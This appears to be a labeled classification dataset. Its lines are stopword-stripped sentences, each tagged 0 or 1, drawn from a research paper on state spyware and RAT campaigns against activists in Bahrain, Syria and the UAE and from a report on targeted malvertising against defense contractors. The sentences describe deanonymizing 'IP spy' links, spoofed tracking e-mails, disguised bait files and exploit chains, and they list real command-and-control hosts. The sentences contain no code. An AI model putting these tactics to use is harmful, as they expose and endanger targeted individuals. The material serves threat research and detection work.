The key IV encrypted using em- bedded RSA-2048 public key stored file data	1
The private key presumably resides C & C server	0
The weak AES keys make decryption data straightfor- ward	0
We wrote program generally find keys hour exploiting fact many system clock readings occur within clock-update quantum	0
In addition FinSpy 's AES code fails encrypt last block data less AES block size 128 bits leaving trail- ing plaintext	0
Finally FinSpy 's wire protocol C & C commu- nication uses type encryption thus subject brute force attack AES keys	1
While suspect FinSpy 's cryptographic deficiencies reflect bugs also con- ceivable cryptography deliberately weakened facilitate one government monitoring surveillance oth- ers	0
C & C server The samples communicated 77.69.140.194 belongs subscriber Batelco Bahrain 's main ISP	1
Analyzing network traffic infected VM C & C server revealed server used global IPID allowed us infer server activity progression	0
In response preliminary work executive Gamma told press Bahrain 's FinSpy server merely proxy real server could anywhere part claim Bahrain FinSpy deployment could associ- ated another government	0
However proxy would show gaps global IPID forwarded traffic ; frequent observation strictly consecutive IPIDs thus contradicts statement	0
Exploitation captured data Since suspected spy- ware operator would likely seek exploit captured credentials particularly associated Bahraini activist organiza- tions worked Bahrain Watch activist organization inside Bahrain	0
Bahrain Watch established fake login page website provided us username pass- word	0
From clean VM logged using credentials saving password Mozilla Firefox	0
We infected VM FinSpy allowed connect Bahrain C & C server	1
Bahrain Watch 's website logs revealed subsequent hit 89.148.0.41-made however site 's home- page rather login page-coming shortly infected VM	0
Decrypting packet captures spyware's activity found VM sent password server exactly one minute earlier The URL provided server include path login page inaccessible home- page	0
This omission reflects fact Firefox password database stores domain names full login page URLs password	0
Repeating experiment yielded hit IP address within minute	0
We inspected Bahrain Watch 's logs showed subsequent ( previ- ous ) activity address instances User Agent string	0
In IP spy attack attacker aims discover IP address victim typically opera- tor pseudonymous social media e-mail account	1
The at- tacker sends pseudonymous account link webpage e-mail containing embedded remote image using one many freely-available services	1
When victim clicks link opens e-mail IP address revealed at- tacker	1
The attacker discovers victim 's identity ISP	0
In one case identified legal documents pro- vided circumstantial link spy link sub- sequent arrest	0
Figure 2 illustrates larger ecosystem attacks	0
The attackers appear represent single entity activity connects back accounts sent links shortened using par- ticular user account al9mood bit.ly URL shortening service	0
Recall Ali Faisal Al-Shufa ( discussed Section 1 ) accused sending insulting tweets account @ alkawarahnews ( Al Kawarah News Figure 2 )	0
An op- erator account forwarded us suspicious private message sent Al Kawarah News Facebook account Red Sky	0
Red Sky purportedly arrested 10/17/12 convicted insulting King Twitter account @ RedSky446 sentenced four months prison	0
When released found passwords Twitter Facebook e-mail accounts changed know recover accounts	0
The message Red Sky 's account sent Al Kawarah News included link shortened using Google 's goo.gl ser- vice	0
We used goo.gl API access analytics link finding unshortened iplogger.org/25SX created 12/8/12	0
The link received one click came Bahrain referrer www.facebook.com	0
Ali 's case files contained request Public Prose- cution information IP address linked Al Kawarah News 22 hours link created	0
Court documents indicate ISP data linked IP address Ali basis sentenced one year prison	0
Red Sky also targeted M Figure 2	0
M recalled click- ing link Red Sky using Internet connec- tion one houses M 's village	0
The house raided police 3/12/13 looking sub- scriber house 's internet connection	0
Police questioning revolved around Tweets referred Bahrain 's King '' cursed one	0
'' Red Sky earlier targeted users IP spy links shortened using al9mood bit.ly account	1
The attack Jehad Abdulla noteworthy ac- count 's activity aligned communities typically critical Bahrain 's opposition	0
However account also directly crit- icized King occasion one case referring '' weak '' '' stingy	0
'' An account linked al9mood sent Je- Abdulla IP spy link 10/2/12 public message	1
On 10/16/12 Salman Darwish arrested insulting King using Jehad Abdulla account	0
He sentenced one month prison partly basis confession	0
Salman's father claims police denied Salman food drink medi- cal care	0
Another account linked al9mood targeted @ YLUBH Twitter account Yokogawa Union trade union Bahraini branch Japanese company	0
@ YLUBH received least three IP spy links late 2012 sent via public Twitter mes sages	1
Yokogawa fired leader trade union Sami Ab- dulaziz Hassan 3/23/13	0
It later emerged Sami indeed operator @ YLUBH account police called questioning relation tweets	0
Use embedded remote images We identified several targets received spoofed e-mails containing embedded remote images	1
Figure 2 shows two cases Maryam Sayed Yousif	0
The attacker sent e-mails using ReadNotify.com records user 's IP address upon mail client downloading remote image	1
While ReadNotify.com forbids spoofing TOS service vulnerability known attackers ( confirmed ) allows spoofing From address directly setting parameters submission form website	0
We found evidence suggesting vulnerabil- ity publicly known appears clear attacker ex- ploited web form adds X-Mai1er RNwebmail header added sending ReadNotify.com's supported methods	0
The header appeared e-mail targets forwarded us	0
When spoofing using method original sender ad- dress still appears X-Sender headers	0
Accord- ing e-mails received targets came fatoomah85 @ gmail.com	0
A link sent one e- mails connected al9mood bit.ly account	0
In monitoring accounts connected al9mood counted 200 IP spy links Twitter messages public Facebook posts	0
Attackers often used ( 1 ) accounts promi- nent trusted jailed individuals like '' Red Sky '' ( 2 ) fake personas ( e.g. attractive women fake job seekers tar- geting labor union ) ( 3 ) impersonations legitimate ac- counts	1
In one particularly clever tactic attackers exploited Twitter 's default font example substituting lowercase '' l '' uppercase '' I '' switching vowels ( e.g	0
'' '' '' e '' ) create at-a-glance identical usernames	0
In addition malicious accounts tended quickly delete IP spy tweets sent via ( public ) mentions frequently change profile names	0
The use RATs opposition well- documented feature Syrian Civil War since first re- ports published early 2012 [ ]	0
The phenomenon widespread experience mem- bers opposition know hacking taking place	0
As summarized Table 3 attacks often include fake ma- liciously packaged security tools ; intriguing ideological movement-relevant content ( e.g lists wanted persons )	1
The seeding techniques bait files suggest good understanding opposition 's needs fears behavior coupled ba- sic familiarity off-the-shelf RATs	0
In cases attacks occur context points direct connection one belligerents Syrian opposition regularly ob- served detainees ' accounts begin seeding malware shortly arrest government forces	0
Researchers security professionals already profiled many RATs including DarkComet [ ] Black- shades Remote Controller Xtreme RAT njRAT ShadowTech	0
Some available purchase any- one contrast '' government '' FinSpy RCS	0
For ex- ample Xtreme RAT retails e350 version Black- shades lists e40	0
Others like DarkComet free	0
We also observed cracked versions RATs Arabic- language hacker forums making available little ef- fort payment trail	0
While RATs cheaper less sophisticated FinSpy RCS share ba- sic functionality including screen capture keylogging remote monitoring webcams microphones remote shell file exfiltration	1
In common attack sequence observed illus- trated three examples Figure 3 attacker seeds mal- ware via private chat messages posts opposition-controlled social media groups e-mail	1
These techniques often limit world-visibility malicious files links slowing detection common AV products	1
Typically targets receive either ( 1 ) PE .zip .rar ( 2 ) file download link ( 3 ) link trigger drive-by download	1
The messages usually include text often Arabic attempts persuade target execute file click link	1
The first attacks Figure 3 date 2012 use bait files DarkComet RAT payload	1
These attacks share C & C 216.6.0.28 Syrian IP address belonging Syr- ian Telecommunications Establishment publicly reported C & C Syrian malware since February 2012	1
The first bait file presents victim PDF containing infor- mation planned uprising Aleppo	1
In fact file Windows Screensaver ( .scr	1
) masquerades PDF using Unicode RLO rendering name '' .fdp.scr	1
'' dis- play victim '' .rcs.pdf	0
	0
'' The second bait file dummy program containing DarkComet masquerading Skype call encryption program playing opposition para- noia government backdoors common software	1
The third attack Figure 3 observed October 2013 entices tar- gets e-mails purporting contain link videos current conflict infecting victims Xtreme RAT using C & C tn1.linkpc.net	1
For seeding attackers typically use compromised ac- counts ( including arrested individuals ) fake iden- tities masquerading pro-opposition	1
Our illustration shows abstract terms use Victim A 's account seed mal- ware ( '' Aleppo Plan '' ) via ( say ) Skype messages Victim ( ) Bn	0
In cases Opp	0
Member C NGO Worker D ( actual victims abstract ) targeting e-mail domains apparently belonging opposition groups in- dicating potential compromise	1
One domain remains active hosting website Salafist Al-Nusra front appears dormant	0
Opp Member C received malicious file e-mail attachment NGO Worker D sent shortened link ( url [ ] no/Uu5 ) download directory Mrconstrucciones [ ] net site may com- promised	1
Both attacks resulted Xtreme RAT infection	1
Interestingly case fake Skype encryption deception extended YouTube video '' IT Se- curity Lab '' demonstrating program 's purported ca- pabilities well website promoting tool skype- encryption.sytes.net	0
The attackers also constructed ba- sic faux GUI '' Encryption '' program ( see Figure 4 )	0
The fake GUI number non-functional buttons like '' En- crypt '' '' DeCrypt '' generate fake prompts	0
While dis- tracted meaningless interaction victim 's machine infected DarkComet 3.3 [ ]	1
Anecdotally campaign volume appears track significant events ongoing conflict	0
For example campaigns dwin- dled rebounded within hours Syria 's 2012 Inter- net shutdown	0
Similarly activity observed authors also dwindled prior expectation US-led military action Syrian government targets September 2013	0
Once option appeared table volume new samples campaigns observed increased includ- ing recent targeting NGO workers per Figure 3	0
We aware negligible number cases opposition using similar RATs Syrian Government supporters al- though evidence exists kinds electronic attacks third parties	0
The logistics activities Syria 's numerous opposition groups intentionally concealed public view protect efficacy lives people participating	0
Nevertheless Syrian opposition members generally familiar stories digital compro- mises high-profile figures including entrusted sensitive roles well rank-and-file members	0
Com- promise operational security poses documented threat life victims electronic compromise family members associates	0
The Syrian conflict ongoing making difficult assem- ble comprehensive evidence linkages government actors malware campaigns	0
Moreover many individuals whose identities compromised prison oth- erwise disappeared thus unable relate evidence pre- sented interrogation	0
Still strong circumstantial evidence links use RATs phishing government ac- tivity briefly summarize ( 1 ) many Syrians recounted journalists authors interrogators con- fronted material computers	0
For example The policeman told '' Do remember talking friend told something wrong [ sic ] paid lot money ? At time taking information laptop	0
'' ( 2 ) Syrian activists supplied cases international journal- ists arrests quickly followed social me- dia accounts detained individuals seeding malware contact lists ( Figure 3 )	0
( 3 ) Finally despite notoriety attack campaigns including mention C & C IPs international me- dia Syrian government made public statements campaigns acted shut servers	0
Beyond ongoing challenges attribution malware campaigns tangible impact Syrian opposition generally align interests Syrian government's propaganda operations	0
The case Abdul Razzaq Tlass leader Free Syrian Army illustrative potential uses campaigns	0
In 2012 string videos emerged showing Tlass sexting engaged lewd activity front webcam	0
While denied videos harm rep- utation substantial eventually replaced	0
While UAE experienced recent uprising politi- cal unrest nevertheless cracked opposition concurrent Arab Spring	0
The first attacks observed UAE involved government-grade '' lawful interception '' trojan known Re- mote Control System ( RCS ) sold Italian company Hack- ing Team	1
The associated C & C server indicated direct UAE government involvement	0
Over time stopped receiving RCS samples UAE targets instead observed shift use off-the-shelf RATs possible involvement cyber-mercenary groups	0
However poor attacker operational security .allowed	0
us link observed attacks together	0
UAE activist Ahmed Mansoor ( per Figure 5 ) impris- oned April November 2011 signing online pro- democracy petition received e-mail purportedly '' Arabic Wikileaks '' July 2012	0
He opened associated at- tachment '' veryimportant.doc '' saw described '' scrambled letters ''	0
He forwarded us e-mail investiga- tion	0
The attachment exploited CVE-2010-3333 RTF pars- ing vulnerability Microsoft Office	0
The document contain bait content part malformed RTF triggered exploit displayed document	0
The exploit loaded shellcode downloaded second stage ar-24.com turn downloaded spyware ar-24.com	1
We denote combination 3-Stage Ex- ploit Kit Figure 5	0
The C & C server also ran ar-24.com	1
When ob- tained sample July 2012 ar-24.com resolved IP address Linode hosting provider	0
Three months later resolved UAE address belonging Royal Group organization linked UAE government ; chaired Sheikh Tahnoon bin Zayed Al-Nayhan member UAE ruling family son founder UAE	0
Identification RCS We identified strings memory matched Symantec analysis RCS ( also known DaVinci Crisis ) product Italian com- pany Hacking Team	0
We also located structurally sim- ilar Word document via VirusTotal	0
The document used exploit attempted download second stage rcs-demo.hackingteam.it unavailable time testing	1
Analysis capabilities RCS suite functionality largely similar FinSpy	0
One difference vectors used install spyware	1
We located additional samples ( see § 5 ) embedded .jar file installs OS-appropriate version RCS ( Windows OSX ) option- ally using exploit	1
If embedded applet exploit present Java displays security warning asks user whether authorize installation	0
We also saw instances 3-Stage Exploit Kit first stage contained Flash exploit ; cases could obtain stages confirm installed RCS	1
Some samples packed MPress packer Windows samples obfuscated look like PuTTY SSH client	1
Another difference persistence	0
For example RCS sample sent Ahmed adds Run registry key whereas FinSpy samples used Bahrain overwrite hard disk 's boot sector modify boot process ; spyware loaded be- fore OS injects OS processes start	1
The RCS samples examined also ability propa- gate devices including inactive VMWare virtual machines modifying disk image onto USB flash drives onto Windows Mobile phones	1
We observe similar capabilities FinSpy samples examined	0
Exploitation captured data When Ahmed Mansoor re- ceived RCS document opened infecting computer ( Figure 5 )	0
Ahmed subsequently noted several suspicious ac- cesses GMail account using IMAP	1
Even changed password accesses continued	1
While corresponding Ahmed compromised account author pa- per discovered attackers installed application- specific password Ahmed 's GMail account secondary password apparently used access account even changed main password	1
The suspicious accesses stopped removal application-specific password	0
Two weeks correspondence Ahmed one us ( Author Figure 5 ) received targeted e-mail link file hosted Google Docs containing commercial off-the- shelf RAT Xtreme RAT	1
The e-mail sent UAE's timezone ( well countries ) contained terms '' veryimportant '' '' wikileaks '' like e-mail re- ceived Ahmed	0
The instance Xtreme RAT sent Author used owner.no-ip.biz C & C one domains men- tioned report published Norman year-long cam- paign cyberattacks Israeli Palestinian targets carried group Norman unable identify	1
Three months Author targeted Ahmed received e-mail containing attachment Xtreme RAT talked C & C server ( Figure 5 ) suggesting attackers infected Ahmed RCS may provided list interest- ing e-mail addresses another group targeting	1
Possible consequences Shortly targeted Ahmed says physically assaulted twice attacker appeared able track Ahmed 's location	0
He also re- ports car stolen large sum money disappeared bank account passport confiscated	0
He believes consequences part government in- timidation campaign uncover direct links infection	0
( Interestingly spyware subse- quently sent others used bait content Ahmed	1
) Further attacks In October 2012 UAE Journalist A Human Rights activist B ( per Figure 6 ) forwarded us suspi- cious e-mails received contained Word docu- ment corresponding first stage 3-Stage Exploit Kit ( Figure 5 )	1
The attachment contained embedded Flash file exploited vulnerability fixed Adobe Flash 11.4 loading shell code download second stage faddeha.com	1
We unable obtain second stage ultimate pay- load website unavailable time testing	0
However exploit kit appears indicative Hacking Team involvement	0
A page faddeha.com found Google's cache contained embedded .jar	0
applet class ( WebEnhancer ) observed .jar	0
files found contain RCS	0
We found file VirusTotal downloaded faddeha.com appeared re- mote access toolkit known SpyNet available general pur- chase 50 Euros	0
The SpyNet sample communicated C & C hamas.sytes.net	1
SpyNet Packing We found another instance first stage 3-Stage Exploit Kit VirusTotal	0
The exploit downloaded second stage turn downloaded sam- ple SpyNet maile-s.com	1
This sample SpyNet communicated C & C hamas.sytes.net	1
The sample packed using ASProtect	0
When run sample unpacks compiled Visual Basic project loads via RunPE method executable packed UPX	1
Finally executable unpacks SpyNet	0
SpyNet 's GUI offers option pack UPX suggesting attack- ers specially added layers packing	0
In cases Visual Basic project bears name NoWayTech appears underground RunPE tool others named SpyVisual unable trace public underground tools thus also may reflect customiza- tion attacker	0
The SpyVisual projects contain string c \Users\Zain\AppData\Local\Temp\OLE1EmbedStrm.wav used fingerprint VB Packer Figure 6	0
Cedar Key attack The VB Packer used attack Relative political detainee D H.R	0
activist E Figure 6	0
These individuals received e-mails containing link web page hosted cedarkeyrv.com impersonat- ing YouTube	1
Loading page greeted target '' Video loading please wait	0
	0
	0
'' The page redirected YouTube video seconds later first loaded Java exploit -a known vulnerability patch time e-mails sent	1
Oracle released patch 12 hours activists began receiving links	0
The cedarkeyrv.com domain associated RV park Cedar Key Florida	0
The website 's hosting company told us site apparently suffered compromise details	0
The exploit used attack appears origi- nally posted Kuwaiti user njq8 Arabic-language exploit sharing site	0
We contacted njq8 told us obtained exploit elsewhere modified prior posting	0
The attack downloaded instance SpyNet isteeler.com ( inspection appear legitimate content ) used C & C storge.myftp.org	1
This C & C occurred an- attack ( Figure 6 ) targeting Relative political detainee D ; case payload freely-available RAT known njRAT written njq8 exploit-poster dis- cussed	0
However find evidence suggesting njq8 's involvement either attack	0
More SpyNet attacks The domain hamas.sytes.net previously saw used two SpyNet sam- ples resolved 67.205.79.177	0
Historically dreems.no-ip.ca also resolved address	0
An unidentified dropper using C & C targeted Journalist F ; SpyNet attack Relative political detainee D also used C & C	1
In latter case sample arrived via e-mail .rar attachment contained .scr file disguised Word document	1
The .scr file self-extracting archive decompressed ran bait document payload	1
The SMTP source e-mail webmail.upload.bz	0
Appin In early 2013 UAE H.R	0
activist E forwarded nu- merous documents included particular CVE-2012-0158 exploit Microsoft Word	0
In totaled 17 distinct hashes documents 10 distinct hashes payloads ( documents differed hash downloaded pay- load )	1
The exploits primarily downloaded instances SpyNet upload.bz part communicated C & C sn.all-google.com	1
This domain also used C & C attacks including Journalist C. Two CVE-2012-0158 exploits down- loaded DarkComet www.getmedia.us www.technopenta.com posting system infor- mation random123.site11.com	1
All three domains match used Indian cybermercenary group said linked Appin Security Group	0
The former two domains hosted content spyware ( i.e. may compromised )	0
We alerted owner www.getmedia.us removed payloads	0
The samples received afforded us opportunity em- pirically characterize use FinFisher Hacking Team around world enabling us assess prevalence identify country cases may warrant future investiga- tion	0
We analyzed samples behavior C & C servers develop indicators ( fingerprints ) servers respond certain types requests	0
We scanned full Internet IPv4 address space ( '' /0 '' ) along prob- ing results found past scans	0
In many cases release full details fingerprints avoid compromising may legitimate investigations	0
Identifying linking servers We developed number fingerprints identifying FinSpy servers using HTTP- based probing well FinSpy 's custom TLV-based proto- col. We leveraged quirks specific non-compliance RFC 2616 responses certain types invalid data presence signatures bizarre '' Hallo Steffi '' Guarnieri identified Bahraini FinSpy C & C servers [ ]	0
See Appendix A details	0
We exhaus- tively scanned Internet looking matches finger- prints	0
Gamma documentation advertises operator FinSpy obscure location C & C server ( called mas- ter ) setting proxy known relay	1
In Spring 2013 noticed FinSpy servers issuing 302 Redirects google.com	0
However noticed anomalies ex- ample servers India redirecting Latvian ver- sion Google google.lv	0
We suspect server India relay forwarding master Latvia	0
Be- cause master served proxy Google could uncover IP address using Google feature prints user 's IP address query '' IP address	0
'' We created additional fingerprint based proxying behavior is- sued GET /search ? q=ip+address & nord=1 requests servers We note interesting master locations Table 4	0
Server locations In fingerprints matched 92 dis- tinct IP addresses 35 different countries	0
Probing 8/8/13 revealed 22 distinct addresses still responding sited Bahrain Bangladesh Bosnia Herzegovina Estonia Ethiopia Germany Hong Kong Indonesia Macedonia Mex- ico Romania Serbia Turkmenistan United States	0
We found servers responding number fingerprints sug- gesting either servers lag updates con- certed effort vary behavior FinSpy servers make detection harder	0
We found ( 1 ) 3 IP addresses ranges registered Gamma	0
( 2 ) Servers 3 IP ranges explicitly registered govern- ment agencies Turkmenistan 's Ministry Communications Qatar 's State Security Bureau Bulgarian Council Ministers	0
( 3 ) 3 additional IP addresses Bahrain Batelco	0
( 4 ) Servers 7 countries governments classified '' authoritarian regimes '' The Economist Bahrain Ethiopia Nigeria Qatar Turkmenistan UAE Vietnam	0
Additional FinSpy samples In parallel scanning obtained 9 samples FinSpy writing YARA rules '' malware hunting '' feature VirusTotal Intelligence	0
This feature sends us newly-submitted samples match signatures	0
We located version FinSpy use normal FinSpy handshake instead uses protocol based HTTP POST requests communication C & C server	1
This appear older newer ver- sion protocol suggesting scan results may reveal full scope FinSpy C & C servers	0
Perhaps HTTP POST protocol delivered specific Gamma customer meet requirement	0
We began analyzing UAE RCS sample Ahmed 6 samples obtained VirusTotal searching AV re- sults containing strings '' DaVinci '' '' RCS	0
'' At time several AV vendors added detection RCS based sample analyzed Dr	0
Web UAE RCS sample sent Ahmed	0
We also similarly obtained analyzed sam- ples FSBSpy piece malware report system information upload screenshots drop execute malware	1
Based samples devised YARA signa- tures yielded 23 additional samples structurally similar malware	0
Fingerprints We probed C & C servers RCS FSBSpy samples found responded distinc- tive way HTTP requests returned distinctive SSL cer- tificates	0
We searched sources including Shodan 5 Internet Census service probes Critical.IO scanning data observed distinctive HTTP behavior	0
We searched dis- tinctive SSL certificates two Internet Census service probes SSL certificate scans ZMap	0
We also contacted team TU Munich applied fingerprints SSL scanning data	0
Across sources obtained 31,345 indicator hits reflecting 555 IP addresses 48 coun- tries	0
One SSL certificate returned 175 servers issued '' /CN=RCS Certification Authority /O=HT srl '' apparently referring name spyware company	0
Servers 5 FSBSpy samples 2 RCS samples re- sponded type certificate	0
Some servers returned certificates chains in- cluded another distinctive certificate	0
We found 175 distinct IP addresses ( including C & C 's 5 FSBSpy samples 2 RCS samples ) responded second type certificate	0
We devised two indicators one matched 125 IP addresses including 7 FSBSpy samples ' C & C 's one matched 2 IP addresses Italy Kazakhstan	0
Server locations On 11/4/13 probed IP ad- dresses collected finding 166 active addresses match- ing one fingerprints 29 different countries	0
We sum- marize top providers countries Table 5	0
The prevalence active servers either located USA hosted Linode striking seems indicate pervasive use out-of-country web hosting VPS services	0
In addition found ( 1 ) 3 IP addresses /28 named '' HT public subnet '' registered CFO Hacking Team	0
The domain hackingteam.it resolves address range	0
( 2 ) An address belonging Omantel majority-state-owned telecom Oman	0
This address un- reachable probed ; researcher pointed us FS- BSpy sample contained Arabic-language bait document Omani poetry talked C & C UK	1
( 3 ) 7 IP addresses belonging Maroc Telecom	0
Moroccan journal- ists Mamfakinch.com previously targeted RCS 2012	0
( 4 ) Overall servers 8 countries governments deemed '' authoritarian regimes '' Azerbaijan Kazakhstan Nigeria Oman Saudi Arabia Sudan UAE Uzbekistan	0
Link Hacking Team All active servers match- ing one signatures also responded peculiarly queried particular ill-formed HTTP requests respond- ing '' HTTP1/1 400 Bad request '' ( '' HTTP/1.1 '' ) body '' Detected error HTTP code 400 ''	0
Googling response yielded GitHub project em-http-server Ruby-based webserver	0
The project 's author listed Alberto Ornaghi software architect Hacking Team	0
We suspect Hacking Team C & C server code may incorporate code project	0
Links servers We identified many cases several servers hosted different providers different countries returned identical SSL certificates matching fin- gerprints	0
We also observed 30 active servers used global IPID	0
Only one active server neither global IPID SSL certificate matching fingerprints	0
We assessed whether servers returning SSL certificates forwarding servers global IPIDs inducing bursts traffic former monitoring IPID latter	0
For 11 servers found server 's activity correlated bursts sent servers	0
We grouped servers SSL certificates returned found group forwarded sin- gle server except one case group forwarded two different IPs ( Morocco )	1
We also found two groups forwarded address	1
There 1:1 mapping remaining 8 addresses groups	0
We refer group along server ( ) forwards server group	0
We identified several server groups may associated victims operators certain country	0
Some suggest possible investigation Turkey We identified group containing 20 servers 9 countries	0
Two RCS 5 FSBSpy samples VirusTo- tal communicated various servers group	1
The RCS samples also communicated domains lapsed registra- tions registered observe incoming traffic	1
We ex- clusively received RCS traffic Turkish IP addresses	0
( RCS traffic identifiable based distinctive user agent URL POST requests	0
) A sample FSBSpy apparently installed exploit Turkish server talked one servers group	1
We also found server groups containing servers Uzbek- istan Kazakhstan ; found FSBSpy samples Virus- Total uploaded countries communicated servers groups	1
In cases save Turkey country identi- fied classified '' authoritarian regime '' may using Hacking Team products types targets profile paper	0
In case Turkey hints tool may employed dissidents	0
Targeted surveillance individuals conducted nation-states poses exceptionally challenging security problem given great imbalance resources expertise victims attackers	0
We sketched nature problem space reported us targeted individuals three Middle Eastern countries	0
The attacks include spyware ongoing monitoring use '' IP spy '' links deanonymize voice dissent	1
The attacks sometimes incorporating effective so- cial engineering general lack novel technical elements	1
In- stead employ prepackaged tools developed vendors acquired cybercrime underground	0
This technol- ogy sometimes suffers strike us amateurish mis- takes ( multiple serious errors implementing cryptography bro- ken protocol messages ) attackers ' employment ( identifying-information embedded binaries C & C servers discoverable via scanning '' Google hacking '' clusters at- tack accounts tied common activity )	0
Some errors assisted efforts assemble strong circumstantial evidence governmental origins	0
In addition mapped global use two '' governmental '' hacking suites including identify- ing 11 cases appeared used countries governed '' authoritarian regimes	0
'' We aim work inspire additional research efforts addressing difficult problem adequately protect individuals limited resources facing powerful adversaries	0
Open questions include robust practical detection targeted attacks designed exfiltrate data victim's computer well detection defense novel at- tack vectors like tampering Internet connections insert malware	0
The task highly challenging potential stakes likewise high	0
An opposition member reflecting gov- ernment hacking Libya speculated users would execute files even recognizing potentially malicious '' If vulnerable could n't care less	0
	0
	0
desperate get voices	0
	0
	0
matter life death	0
	0
	0
vital get information	0
'' This work supported National Science Foundation grants 1223717 1237265 Citizen Lab Fel- lowship	0
Any opinions findings conclusions recom- mendations expressed material authors necessarily reflect views sponsors	0
The authors would like thank following individuals help various aspects analysis Bernhard Am- man Collin D. Anderson Brandon Dixon Zakir Durumeric Eva Galperin Claudio Guarnieri Drew Hintz Ralph Holz Shane Huntley Andrew Lyons Mark Schloesser Nicholas Weaver	0
Previous work Guarnieri scanning FinSpy servers found response request GET / Bahraini FinSpy C & C server returns response string '' Hallo Steffi ''	0
Guarnieri searched database responses compiled Critical.IO Internet scanning project locating 11 additional servers 10 countries	0
We refer fingerprint α1	0
Concurrent ef- fort devised fingerprint β1 tested three as- pects handshake FinSpy infectee Fin- Spy C & C server follows custom TLV-based protocol running ports 22 53 80 443	0
We conducted targeted scanning several countries using β1 also con- firmed Guarnieri 's findings servers still reachable af- ter published findings	0
We observed trend changes HTTP response behavior FinFisher publication findings software	0
In July 2012 example post Bahraini FinSpy samples servers closed TCP connection response GET / HEAD / request ( although servers continued behave consistently β1	0
Other changes followed later 2012 including new response GET / requests in- cluded imperfect copy Apache server 's HTTP response ( Date header used UTC rather GMT )	0
We fingerprinted error α2 later 2012 fingerprinted distinctive behavior response GET / requests α3	0
Subsequent scans /0 α2 α3 five service probes Internet Census α1 α3 located several additional servers	0
In Feburary 2013 identified finger- printed new HTTP response behavior α4 modified β1 produce β2 tests two three aspects FinSpy handshake ( third test β1 broken Fin- Spy servers updated accept types invalid data previously rejected )	0
As 3/13/13 servers matched α fingerprint matched β2	0
Most targeted attacks organizations originate spear-phish campaigns watering hole style web driveby attacks	1
Within last six months Invincea discovered stopped targeted malvertizing attacks specific companies -- particularly Defense Industrial Base	0
The combination traditional cyber crime methods ( malvertising ) targeted attacks Defense industrials theft IP represents another development on-going blending techniques cyber crime advanced threat actors nation state agendas	0
We tracking on-going campaign US Defense companies code name Operation DeathClick	0
Traditional malvertizing effective indiscriminate method cyber crime gangs use compromise endpoints perpetrate ad fraud identity fraud banking credential theft	1
In new targeted variation malvertizing perpetrators attacking specific organizations leveraging real- time ad bidding networks micro-targeting techniques developed last decade online advertising	0
The objective micro-targeted attacks Defense sector likely theft Intellectual Property ad fraud indicates motive sophistication characteristic advanced threat actors	0
Since attacks blocked Invincea prior compromise machine network confirm specific IP perpetrators – Tactics Techniques Protocols ( TTPs ) used describe herein similar methods used provide backdoor access command control compromised networks	1
While discovered attacks across multiple Defense companies expect long already highly targeted segments including Federal Financial Services Manufacturing HealthCare victimized micro-targeted malvertising	0
The campaign described represent single flaw 0-day unpatched bug rather significant development adversary 's capabilities strategy leverage legitimate online advertising platforms well-known ad supported websites via technique called Real-Time Ad Bidding	0
In words problem patched Tuesday	0
UPDATE We updated document include new section campaign distributing CryptoWall ransomware via malvertising	0
While attack vector believe motivated cybercrime rather theft IP Defense companies	0
Malvertising seen meteoric rise 2014	0
Threat actors create corporate front advertise commonly visited sites later switch landing pages ads pages host exploit kits simply create temporary redirection usual content malicious landing page	1
These exploit kits hosted compromised web servers across world	0
In words leverage legitimate ad-supported popular websites together compromised websites hosting exploit landing pages defeating black-listing techniques	0
The lifetime ads landing pages measured hours	0
In campaign described Operation DeathClick traditional malvertising armed micro-targeting system using IP address ranges geographically narrowed zip codes interests user ( recorded cookies ) target specific companies company types user interests/preferences	1
They employing tactics real-time ad bidding guarantee malicious ad delivery intended targets campaign – building decade work real-time analytics online ad placement nefarious purposes	0
The threat actors redirect ads minutes time abandon exploit kit pages forever	0
This means list-based threat intelligence feeds rendered ineffective	0
The domains used appear proxy blacklist malware droppers delivered exploit pages always employ different signatures evading traditional network endpoint detection technology	0
Ad delivery networks today incentivized address problem credible manner derive revenue criminal enterprise held accountable	0
Turning blind eye problem rewarded economically	0
Meanwhile perpetrators able use traditional malvertising ad fraud bots fund criminal enterprise	0
Without cooperation ad networks vet advertisers working front companies attack vector go unchecked	0
And advent real-time ad bidding threat actors weaponized ad delivery networks target victims based Real-time ad bidding allows advertisers extension adversaries micro-target ad delivery extremely granular basis	1
For example oppressive regimes trying gather intelligence activist protests deliver ads people getting email within specific locality protesting	0
Today commonplace micro-targeting techniques used part toolset legitimate online advertising	0
For instance defense contractor trying win new omnibus contract deliver targeted ads online news sites frequented Government program personnel	0
The latest software product release delivered Windows users visiting PC Magazine 's website	0
A local car dealership sense someone market new car deliver advertising users based solely browsing history	0
Now advanced threat actors able target organization directly via micro-targeted malvertising based solely corporate network IP range	1
Thus n't matter world point web browser -- online video poker room fantasy football club homepage Pakistani news homepage even checking webmail trusted email provider	0
Those ad windows used deliver malware bidding price right	1
Recently multiple US Defense/Aerospace contractors targeted malvertising campaign	1
These contractors deployed world-class enterprise security defense depth approaches protect intellectual property	0
They next generation firewalls relied threat intelligence feeds auto-blocking known malicious sites	0
They malware interception technology relied known bad hashes prevent malicious downloads	0
The multiple proxies place subscribed real time feeds known bad URLs	0
They deployed AV gateways endpoints	0
But two week period organizations hit dozens micro-targeted malvertising attacks would provided beachhead threat actors compromise network successful	1
In instance attacks carried targeting Defense contractors directly via real-time ad bidding	1
Once targeted end user needed browse website anywhere world contained DoubleClick ad-partner embedded window	0
Invincea stopped attacks endpoints containing delivered exploits secure virtual containers producing forensics led discovery	0
Next go detail example attacks perpetrated defense firms	0
It important note websites show next served targeted malvertising victims malvertising campaigns knowledge malicious ads serving	0
These malicious ads served 3rd party networks unwittingly sourcing malicious content	0
As discuss later 3rd party ad networks falling victim malicious content campaigns	0
A user visited online fantasy football league homepage Fleaflicker.com	0
As soon page loaded malicious ad delivered backdoor Trojan via Java-based exploit	1
Figure 1 shows screenshot page visited	0
You notice two inline ad placements DoubleClick ad delivery	0
The malware delivered came compromised Polish website would installed generic backdoor Trojan	1
Note prominent ad placements AdChoice DoubleClick affiliate	0
Figure 2 shows event tree exploit malware delivered ad visiting Fleaflicker.com	1
The event tree Figure 2 taken Invincea 's Threat Management Console shows exploited Java process dropped file called fvJcrgR0.exe likely came Pubmatic ad delivery network allows real time bidding deliver ads	1
In instance Pubmatic server redirected Web server Poland dropped malware	1
The timeline shows exact times URLs visited	0
Note number re-directs Fleaflicker.com different outside properties Figure 3	0
Invincea Threat Management provides quick way search MD5 hash third party sites ( see Figure 4 )	0
By clicking VirusTotal link analyst see following VirusTotal report Figure 5 From VirusTotal report Figure 5 see malware Trojan backdoor would likely used download additional malware provide remote persistent access attacker	1
